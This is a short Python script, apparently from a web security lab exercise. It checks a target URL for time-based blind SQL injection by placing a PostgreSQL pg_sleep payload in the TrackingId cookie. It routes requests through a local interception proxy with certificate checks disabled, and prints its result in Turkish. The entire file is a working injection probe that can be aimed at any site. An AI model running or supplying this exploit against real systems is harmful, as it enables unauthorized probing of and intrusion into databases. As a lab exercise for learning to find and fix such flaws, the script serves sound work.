import requests
import sys
import urllib3
import urllib
import re
from bs4 import BeautifulSoup

# Disable SSL/TLS warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure proxy settings if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def bilind_sql_check(url):
    sql_payload = "'||pg_sleep(10)--"
    sqli_encode = urllib.parse.quote(sql_payload)
    cookies = {'TrackingId':'a8QPFx9KdlWLvgQr'+ sqli_encode,'session':'tiA0TOYaCzSFu3hoyLwDrQVyuqsAYXMG'}
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    if int(r.elapsed.total_seconds())>10:
        print("(+) sql injection var")
    else:
        print("(+) sql injection yok")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] For Example: %s http://www.random.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("(+) check if cookie sql")
    bilind_sql_check(url)
